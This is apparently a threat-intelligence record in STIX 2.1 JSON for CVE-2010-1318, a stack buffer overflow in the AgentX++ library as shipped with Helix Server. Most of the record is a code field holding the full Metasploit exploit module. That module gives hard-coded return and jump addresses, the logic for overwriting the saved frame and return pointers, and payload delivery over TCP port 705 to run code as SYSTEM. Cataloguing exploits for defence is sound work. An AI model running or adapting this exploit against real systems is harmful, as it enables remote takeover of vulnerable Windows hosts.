{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--878b6b0b-929f-438f-9625-393b27401a69",
    "created": "2024-08-14T16:45:39.348754Z",
    "modified": "2024-08-14T16:45:39.348758Z",
    "name": "AgentX++ Master AgentX::receive_agentx Stack Buffer Overflow",
    "description": " This exploits a stack buffer overflow in the AgentX++ library, as used by various applications. By sending a specially crafted request, an attacker can execute arbitrary code, potentially with SYSTEM privileges.  This module was tested successfully against master.exe as included with Real Network\\'s Helix Server v12. When installed as a service with Helix Server the service runs as SYSTEM, has no recovery action, but will start automatically on boot.  This module does not work with NX/XD enabled but could be modified easily to do so. The address ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/agentxpp_receive_agentx.rb",
            "external_id": "agentxpp_receive_agentx.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1318"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=867"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  #include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AgentX++ Master AgentX::receive_agentx Stack Buffer Overflow',\n      'Description'    => %q{\n          This exploits a stack buffer overflow in the AgentX++ library, as used by\n        various applications. By sending a specially crafted request, an attacker can\n        execute arbitrary code, potentially with SYSTEM privileges.\n\n        This module was tested successfully against master.exe as included with Real\n        Network\\'s Helix Server v12. When installed as a service with Helix Server,\n        the service runs as SYSTEM, has no recovery action, but will start automatically\n        on boot.\n\n        This module does not work with NX/XD enabled but could be modified easily to\n        do so. The address\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1318' ],\n          [ 'OSVDB', '63919'],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=867' ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          #'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,  # plenty of space\n          'BadChars' => \"\",    # none!\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\xf0\\xef\\xff\\xff\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Helix Server v12 and v13 - master.exe',\n            {\n              # The BufAddr varies :-/\n              #'BufAddr' => 0xea3800,\n              'BufAddr' => 0x1053880,\n              'BufSize' => 25000,     # If this is too large, the buf is unmapped on free\n              'Ret'     => 0x46664b,  # mov esp,ebp / pop ebp / ret in master.exe\n              'JmpEsp'  => 0x7c3d55b7 # jmp esp from bundled msvcp71.dll\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2010-04-16'))\n\n    register_options([Opt::RPORT(705)])\n  end\n\n  def exploit\n    print_status(\"Trying target #{target.name}...\")\n\n    connect\n    print_status(\"Triggering the vulnerability... Cross your fingers!\")\n\n    num = target['BufSize']\n    num_str = [num].pack('N')\n\n    # First send 19 bytes to almost fill the buffer...\n    hdr = ''\n    hdr << [0x01, rand(256), 0x10 | rand(256), rand(256)].pack('CCCC')\n    hdr << rand_text(16 - hdr.length)\n    #hdr << \"QQQQRRRRSSSS\"\n    hdr << num_str[0,3]\n    sock.put(hdr)\n\n    # Wait to make sure it processed that chunk.\n    select(nil, nil, nil, 0.5)\n    #print_status(\"press enter to trigger...\"); x = $stdin.gets\n\n    # Send the rest (smashed!)\n    hdr = ''\n    hdr << num_str[3,1]\n\n    # NOTE: this stuff is extra, but doesn't count towards the payload..\n    hdr << rand_text(8)\n    #hdr << \"EEEEFFFF\"\n\n    # becomes ebp\n    #hdr << \"\\xeb\" * 4\n    base = target['BufAddr']\n    new_ebp = base + (num / 2)\n    if (mod4 = (num % 4)) > 0\n      # align to 4 bytes\n      new_ebp += (4 - mod4)\n    end\n    hdr << [new_ebp].pack('V')\n\n    # becomes eip\n    #hdr << \"\\xef\\xbe\\xad\\xde\"\n    hdr << [target.ret].pack('V')\n\n    # NOTE: sending more data will smash the low (up to 3) bytes of the socket handle -- no fun\n    sock.put(hdr)\n\n    # Send the data that we said we would...\n    stack = []\n    stack << target['JmpEsp']\n\n    num_rets = (num - payload.encoded.length - 4) / 4\n    num_rets.times {\n      # points to ret instruction\n      stack.unshift(target.ret + 3)\n    }\n\n    stack = stack.pack('V*')\n    stack << payload.encoded\n    # make sure we have all the bytes, or we wont reach the path we want.\n    stack << rand_text(num - stack.length)\n\n    sock.put(stack)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-04-16",
    "x_mitre_platforms": [
        "win'"
    ]
}